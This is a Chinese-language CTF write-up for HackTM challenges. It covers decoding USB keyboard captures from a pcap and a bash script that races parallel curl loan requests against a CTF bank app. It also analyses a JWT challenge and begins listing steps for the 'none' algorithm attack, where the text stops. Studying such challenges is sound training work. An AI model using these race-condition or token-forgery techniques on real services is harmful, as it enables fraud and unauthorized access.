<h3 id="Strange-PCAP"><a href="#Strange-PCAP" class="headerlink" title="Strange PCAP"></a>Strange PCAP</h3><p>考察流量包隐写、usb数据分析</p>
<h4 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h4><p>下载数据包的时候，压缩工具就提示要输入密码，但是是个流量包，直接能打开，输密码干嘛？<br>用<code>binwalk</code>分析一下，发现存在压缩包隐写，<code>binwalk -e</code>提取<br><img src="http://www.ggb0n.cool/images/HackTM-WP100.png" alt=""><br>但是解压需要密码，那就看看数据包里的内容，发现是<code>usb</code>数据，估计就是键盘记录或者鼠标记录了<br><img src="http://www.ggb0n.cool/images/HackTM-WP99.png" alt=""><br>利用常规的方法：把<code>usb数据</code>提取出来，然后用现有的跑键盘记录的脚本跑出来即可。<br>先利用<a href="https://segmentfault.com/a/1190000018886363" target="_blank" rel="noopener">tshark</a>提取数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tshark -r Strange.pcapng -T fields -e usb.capdata | sed &#39;&#x2F;^\s*$&#x2F;d&#39; &gt; usbdata.txt</span><br><span class="line">&#x2F;&#x2F;加上&quot;| sed &#39;&#x2F;^\s*$&#x2F;d&#39;&quot;是因为直接提取的话会有很多空行，加上这一句空行就没了</span><br></pre></td></tr></table></figure>
<p>发现提取的数据如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000104000100000000000000</span><br><span class="line">0000000104000100000000000000000100000000000000000000000000000000000000000000</span><br><span class="line">210008</span><br><span class="line">210010</span><br><span class="line">210012</span><br><span class="line">0000240000000000</span><br><span class="line">0000000000000000</span><br><span class="line">0000190000000000</span><br><span class="line">0000000000000000</span><br><span class="line">00000a0000000000</span><br><span class="line">0000000000000000</span><br><span class="line">00000d0000000000</span><br><span class="line">0000000000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000000000000000</span><br><span class="line">0200000000000000</span><br><span class="line">0200160000000000</span><br><span class="line">0200000000000000</span><br><span class="line">0200160000000000</span><br><span class="line">0200000000000000</span><br><span class="line">0000000000000000</span><br><span class="line">2000000000000000</span><br><span class="line">20000f0000000000</span><br><span class="line">0000000000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000000000000000</span><br><span class="line">2000000000000000</span><br><span class="line">2000110000000000</span><br><span class="line">2000000000000000</span><br><span class="line">0000000000000000</span><br><span class="line">2000000000000000</span><br><span class="line">20000b0000000000</span><br><span class="line">2000000000000000</span><br><span class="line">0000000000000000</span><br><span class="line">2000000000000000</span><br><span class="line">2000190000000000</span><br><span class="line">2000000000000000</span><br><span class="line">0000000000000000</span><br><span class="line">0000180000000000</span><br><span class="line">0000000000000000</span><br><span class="line">0200000000000000</span><br><span class="line">02000e0000000000</span><br><span class="line">0200000000000000</span><br><span class="line">0000000000000000</span><br><span class="line">0000270000000000</span><br><span class="line">0000000000000000</span><br><span class="line">0200000000000000</span><br><span class="line">0200070000000000</span><br><span class="line">0200000000000000</span><br><span class="line">0000000000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000000000000000</span><br><span class="line">0000070000000000</span><br><span class="line">0000000000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000000000000000</span><br><span class="line">0200000000000000</span><br><span class="line">0200090000000000</span><br><span class="line">0200000000000000</span><br><span class="line">0000000000000000</span><br><span class="line">0000280000000000</span><br><span class="line">0000000000000000</span><br><span class="line">210010</span><br></pre></td></tr></table></figure>
<p>直接用脚本跑键盘记录的话，结果如下：<br><img src="http://www.ggb0n.cool/images/HackTM-WP102.png" alt=""><br>可以看到结果不正常，因为上面的数据有很多冗余数据(长度不是8字节的部分)，去掉之后再跑脚本，结果如下：<br><img src="http://www.ggb0n.cool/images/HackTM-WP103.png" alt=""><br>输入密码，即可拿到flag：<br><img src="http://www.ggb0n.cool/images/HackTM-WP104.png" alt=""></p>
<h4 id="键盘记录脚本"><a href="#键盘记录脚本" class="headerlink" title="键盘记录脚本"></a>键盘记录脚本</h4><p>本题用国内的通用脚本解不出来，用国外wp的脚本可以</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#经夏风师傅完善过的国外脚本</span></span><br><span class="line">usb_codes = &#123;</span><br><span class="line">    <span class="number">0x04</span>:<span class="string">"aA"</span>, <span class="number">0x05</span>:<span class="string">"bB"</span>, <span class="number">0x06</span>:<span class="string">"cC"</span>, <span class="number">0x07</span>:<span class="string">"dD"</span>, <span class="number">0x08</span>:<span class="string">"eE"</span>, <span class="number">0x09</span>:<span class="string">"fF"</span>,</span><br><span class="line">    <span class="number">0x0A</span>:<span class="string">"gG"</span>, <span class="number">0x0B</span>:<span class="string">"hH"</span>, <span class="number">0x0C</span>:<span class="string">"iI"</span>, <span class="number">0x0D</span>:<span class="string">"jJ"</span>, <span class="number">0x0E</span>:<span class="string">"kK"</span>, <span class="number">0x0F</span>:<span class="string">"lL"</span>,</span><br><span class="line">    <span class="number">0x10</span>:<span class="string">"mM"</span>, <span class="number">0x11</span>:<span class="string">"nN"</span>, <span class="number">0x12</span>:<span class="string">"oO"</span>, <span class="number">0x13</span>:<span class="string">"pP"</span>, <span class="number">0x14</span>:<span class="string">"qQ"</span>, <span class="number">0x15</span>:<span class="string">"rR"</span>,</span><br><span class="line">    <span class="number">0x16</span>:<span class="string">"sS"</span>, <span class="number">0x17</span>:<span class="string">"tT"</span>, <span class="number">0x18</span>:<span class="string">"uU"</span>, <span class="number">0x19</span>:<span class="string">"vV"</span>, <span class="number">0x1A</span>:<span class="string">"wW"</span>, <span class="number">0x1B</span>:<span class="string">"xX"</span>,</span><br><span class="line">    <span class="number">0x1C</span>:<span class="string">"yY"</span>, <span class="number">0x1D</span>:<span class="string">"zZ"</span>, <span class="number">0x1E</span>:<span class="string">"1!"</span>, <span class="number">0x1F</span>:<span class="string">"2@"</span>, <span class="number">0x20</span>:<span class="string">"3#"</span>, <span class="number">0x21</span>:<span class="string">"4$"</span>,</span><br><span class="line">    <span class="number">0x22</span>:<span class="string">"5%"</span>, <span class="number">0x23</span>:<span class="string">"6^"</span>, <span class="number">0x24</span>:<span class="string">"7&amp;"</span>, <span class="number">0x25</span>:<span class="string">"8*"</span>, <span class="number">0x26</span>:<span class="string">"9("</span>, <span class="number">0x27</span>:<span class="string">"0)"</span>,</span><br><span class="line">    <span class="number">0x2C</span>:<span class="string">"  "</span>, <span class="number">0x2D</span>:<span class="string">"-_"</span>, <span class="number">0x2E</span>:<span class="string">"=+"</span>, <span class="number">0x2F</span>:<span class="string">"[&#123;"</span>, <span class="number">0x30</span>:<span class="string">"]&#125;"</span>,  <span class="number">0x32</span>:<span class="string">"#~"</span>,</span><br><span class="line">    <span class="number">0x33</span>:<span class="string">";:"</span>, <span class="number">0x34</span>:<span class="string">"'\""</span>,  <span class="number">0x36</span>:<span class="string">",&lt;"</span>,  <span class="number">0x37</span>:<span class="string">".&gt;"</span>,   <span class="number">0x38</span>:<span class="string">"/?"</span>,  <span class="number">0x39</span>:<span class="string">"&lt;CAP&gt;&lt;CAP&gt;"</span>,</span><br><span class="line">    <span class="number">0x3a</span>:<span class="string">"&lt;F1&gt;&lt;F1&gt;"</span>, <span class="number">0x3b</span>:<span class="string">"&lt;F4&gt;&lt;F4&gt;"</span>, <span class="number">0x3e</span>:<span class="string">"&lt;F5&gt;&lt;F5&gt;"</span>,<span class="number">0x3f</span>:<span class="string">"&lt;F6&gt;&lt;F6&gt;"</span>,</span><br><span class="line">    <span class="number">0x40</span>:<span class="string">"&lt;F7&gt;&lt;F7&gt;"</span>,<span class="number">0x41</span>:<span class="string">"&lt;F8&gt;&lt;F8&gt;"</span>,<span class="number">0x42</span>:<span class="string">"&lt;F9&gt;&lt;F9&gt;"</span>,<span class="number">0x43</span>:<span class="string">"&lt;F10&gt;&lt;F10&gt;"</span>,</span><br><span class="line">    <span class="number">0x44</span>:<span class="string">"&lt;F11&gt;&lt;F11&gt;"</span>,<span class="number">0x45</span>:<span class="string">"&lt;F12&gt;&lt;F12&gt;"</span></span><br><span class="line">&#125;</span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> open(<span class="string">"usb.txt"</span>,<span class="string">"r"</span>).readlines():</span><br><span class="line">    code = int(x[<span class="number">4</span>:<span class="number">6</span>],<span class="number">16</span>)</span><br><span class="line">    print(x[<span class="number">4</span>:<span class="number">6</span>])</span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">0x28</span>:</span><br><span class="line">        print(<span class="string">'ENTER!'</span>)</span><br><span class="line">        print(data)</span><br><span class="line">        data = <span class="string">''</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    upper = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> int(x[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) == <span class="number">0x02</span> <span class="keyword">or</span> int(x[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) == <span class="number">0x20</span>:</span><br><span class="line">        upper = <span class="number">1</span></span><br><span class="line">    data += usb_codes[code][upper]</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
<p>再附一个国内的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line">    <span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>,</span><br><span class="line">    <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>,</span><br><span class="line">     <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>,</span><br><span class="line">      <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>,</span><br><span class="line">       <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>,</span><br><span class="line">        <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>,</span><br><span class="line">         <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,</span><br><span class="line">         <span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,</span><br><span class="line">         <span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,</span><br><span class="line">         <span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,</span><br><span class="line">         <span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,</span><br><span class="line">         <span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,</span><br><span class="line">         <span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line">    <span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>,</span><br><span class="line">     <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>,</span><br><span class="line">      <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>,</span><br><span class="line">       <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>,</span><br><span class="line">        <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>,</span><br><span class="line">         <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>,</span><br><span class="line">          <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,</span><br><span class="line">          <span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,</span><br><span class="line">          <span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,</span><br><span class="line">          <span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,</span><br><span class="line">          <span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,</span><br><span class="line">          <span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">'2'</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">"00"</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">'2'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">'[unknown]'</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">print(<span class="string">""</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">'&lt;DEL&gt;'</span>)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">"&lt;CAP&gt;"</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'output :'</span> + <span class="string">""</span>.join(output))</span><br></pre></td></tr></table></figure>

<p>这里再拓展一下，usb流量一般是<code>鼠标流量</code>或者是<code>键盘流量</code>，可以参考<a href="https://www.cnblogs.com/hackxf/p/10670844.html" target="_blank" rel="noopener">这里</a>。<br>提供一位师傅的<a href="https://github.com/WangYihang/UsbMiceDataHacker" target="_blank" rel="noopener">工具</a>。</p>
<h3 id="My-Bank"><a href="#My-Bank" class="headerlink" title="My Bank"></a>My Bank</h3><p>一道web的条件竞争题目</p>
<h4 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h4><p>常见的一种题，可以去银行贷款，不过最多贷款600刀，还能去商店买东西，饼干最便宜，但是没法吃，还是买flag吧，但是要1440刀…<br>分析可知，可以利用条件竞争进行贷款，这样就可以拿到不止600刀的资金，再去买flag即可。<br>条件竞争可参考：<a href="https://blog.csdn.net/qq_36992198/article/details/80007405" target="_blank" rel="noopener">https://blog.csdn.net/qq_36992198/article/details/80007405</a></p>
<h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>1、利用BP解题</p>
<ul>
<li>抓包</li>
<li>放到爆破模块，设置空payload，线程设为15</li>
<li>借到足够的钱去买flag</li>
</ul>
<p>首先注册账号并登陆，看一下我们的账户信息：<br><img src="http://www.ggb0n.cool/images/HackTM-WP3.png" alt=""><br>可以看到，我们还可以借600刀，然后设置借钱为100，BP抓包进行爆破，用13-15个线程即可，结果如下：<br><img src="http://www.ggb0n.cool/images/HackTM-WP4.png" alt=""><br>然后回到我们的账户处查看利用条件竞争借到的1000刀已经到账:<br><img src="http://www.ggb0n.cool/images/HackTM-WP5.png" alt=""><br>这里需要多次尝试才能借到足够的钱数，每次结果都可能是不一样的。因为利用BP进行条件竞争的时候有时候会受到网速、服务质量等各种因素的影响，多试几次就好了。</p>
<p>2、BASH脚本<br>看国外大佬的解题思路学到了一种利用bash脚本进行条件竞争的方式(其实用python也一样)，脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">url=<span class="string">"http://178.128.175.6:50090/"</span></span><br><span class="line">ua=<span class="string">"User-Agent: Mozilla/5.0"</span></span><br><span class="line">cookie=<span class="string">"session=.eJwNy0sKAjEMANC7ZG1hmmTy8TLStAmIoKDOSry7vv37wHw96_J-3PIOZwhCNNlimhOPlTor3IYOWjkijbOHFBac4Diu6z-Ute9SvWGZNaaNm3tko4mdQnRXF_j-AEMAHN8.Xjaggw.o-B9vO_i0Fnredto0K7aoEXTCGI"</span></span><br><span class="line">ssrf=`curl -s <span class="string">"<span class="variable">$url</span>"</span> -H <span class="string">"<span class="variable">$ua</span>"</span> -H <span class="string">"Cookie: <span class="variable">$cookie</span>"</span> 2&gt;&amp;1 | pcregrep -o1 <span class="string">'name=\"csrf_token\" type=\"hidden\" value=\"(.*)\"'</span> -`</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 15`; </span><br><span class="line">    <span class="keyword">do</span> curl <span class="string">"<span class="variable">$url</span>"</span> -H <span class="string">"<span class="variable">$ua</span>"</span> -H <span class="string">"Cookie: <span class="variable">$cookie</span>"</span> --data <span class="string">"csrf_token=<span class="variable">$ssrf</span>&amp;loan=100"</span> &amp;</span><br><span class="line">; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">sleep 6 &amp;&amp; <span class="built_in">echo</span> <span class="string">"[*] maybe haxed?"</span> &amp;&amp; curl -s <span class="string">'http://178.128.175.6:50090/'</span> -H <span class="string">"<span class="variable">$ua</span>"</span> -H <span class="string">"Cookie: <span class="variable">$cookie</span>"</span> 2&gt;&amp;1 | pcregrep -o1 <span class="string">"Money: (.*) tBTC"</span></span><br></pre></td></tr></table></figure>
<p>这里利用了一个技巧：在<code>cURL</code>命令之后附加一个<code>&amp;</code>使进程移到后台。这样，可以同时发出多个请求，并且不需要编写一个处理多线程的复杂代码。</p>
<h3 id="Draw-With-Us"><a href="#Draw-With-Us" class="headerlink" title="Draw With Us"></a>Draw With Us</h3><p>一个<code>JWT</code>攻击题目，进入题目是下图的一个改颜色的web端游戏，给出Hint：<code>Changing your color is the first step towards happiness.</code><br><img src="http://www.ggb0n.cool/images/HackTM-WP6.png" alt=""><br>同时题目还给了一个json附件，实现代码都在其中，其中包含关键部分：</p>
<ul>
<li>NodeJS Express服务器</li>
<li>登录/管理员管理/socket.io</li>
<li>JWT算法：<code>HMAC-SHA256</code></li>
<li>管理员用户名：<code>hacktm</code></li>
</ul>
<h4 id="题目分析-amp-一些攻击尝试"><a href="#题目分析-amp-一些攻击尝试" class="headerlink" title="题目分析&amp;一些攻击尝试"></a>题目分析&amp;一些攻击尝试</h4><h5 id="破解JWT秘钥"><a href="#破解JWT秘钥" class="headerlink" title="破解JWT秘钥"></a>破解JWT秘钥</h5><p>代码中获取flag的函数如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">app.get("/flag", (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Get the flag</span></span><br><span class="line">  <span class="comment">// Only for root</span></span><br><span class="line">  if (req.user.id == 0) &#123;</span><br><span class="line">    res.send(ok(&#123; flag: flag &#125;));</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    res.send(err("Unauthorized"));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>想要得到flag，就必须满足<code>req.user.id == 0</code>，那么就需要想办法构造JWT。看国外大佬的WP写的对JWT秘钥进行攻击，但是没有成功。</p>
<h5 id="暴力破解n"><a href="#暴力破解n" class="headerlink" title="暴力破解n"></a>暴力破解n</h5><p>下面这段代码给出了<code>req.user.id</code>的生成算法：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">app.post("/init", (req, res) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Initialize new round and sign admin token</span></span><br><span class="line">  <span class="comment">// RSA protected!</span></span><br><span class="line">  <span class="comment">// POST</span></span><br><span class="line">  <span class="comment">// &#123;</span></span><br><span class="line">  <span class="comment">//   p:"0",</span></span><br><span class="line">  <span class="comment">//   q:"0"</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">  let &#123; p = "0", q = "0", clearPIN &#125; = req.body;</span><br><span class="line"></span><br><span class="line">  let target = md5(config.n.toString());</span><br><span class="line"></span><br><span class="line">  let pwHash = md5(</span><br><span class="line">    bigInt(String(p))</span><br><span class="line">      .multiply(String(q))</span><br><span class="line">      .toString()</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  if (pwHash == target &amp;&amp; clearPIN === _clearPIN) &#123;</span><br><span class="line">    <span class="comment">// Clear the board</span></span><br><span class="line">    board = new Array(config.height)</span><br><span class="line">      .fill(0)</span><br><span class="line">      .map(() =&gt; new Array(config.width).fill(config.backgroundColor));</span><br><span class="line">    boardString = boardToStrings();</span><br><span class="line"></span><br><span class="line">    io.emit("board", &#123; board: boardString &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Sign the admin ID</span></span><br><span class="line">  let adminId = pwHash</span><br><span class="line">    .split("")</span><br><span class="line">    .map((c, i) =&gt; c.charCodeAt(0) ^ target.charCodeAt(i))</span><br><span class="line">    .reduce((a, b) =&gt; a + b);</span><br><span class="line"></span><br><span class="line">  console.log(adminId);</span><br><span class="line"></span><br><span class="line">  res.json(ok(&#123; token: sign(&#123; id: adminId &#125;) &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>代码中的<code>p</code>和<code>q</code>是用户输入，<code>n</code>是秘钥。由于md5的结果为32个字符，且<code>target</code>长度与<code>pwHash</code>相同，同时<code>toString</code>暗示<code>n</code>是数字。<br><code>adminId</code>是利用<code>target</code>计算的，每个字符都经过了<code>XOR</code>运算。在<code>map()</code>的迭代中，两个字符相同的结果即为0，最后通过<code>reduce()</code>会计算出所有数的结果，若0，则<code>req.user.id==0</code>。<br>然而，如果哈希值不匹配的话，<code>req.user.id</code>就会是一个大于<code>0</code>的数字。<br>由于<code>reduce()</code>消除线性搜索推导的可能性，因此无法现实地对此进行暴力破解<code>n</code>，必须找到另一种方式。</p>
<h5 id="JWT-none-攻击"><a href="#JWT-none-攻击" class="headerlink" title="JWT none 攻击"></a>JWT none 攻击</h5><p>这种攻击方法可参考：<a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/" target="_blank" rel="noopener">https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/</a></p>
<ul>
<li>1、替换或者更改JWT有效负载</li>
<li>2、更改<code>id</code>，如<code>{&quot;id&quot;:1374,&quot;iat&quot;:1580560256}</code> -&gt; <code>{&quot;id&quot;:0,&quot;iat&quot;:1580560256}</code></li>
<li>3、删除签名</li>
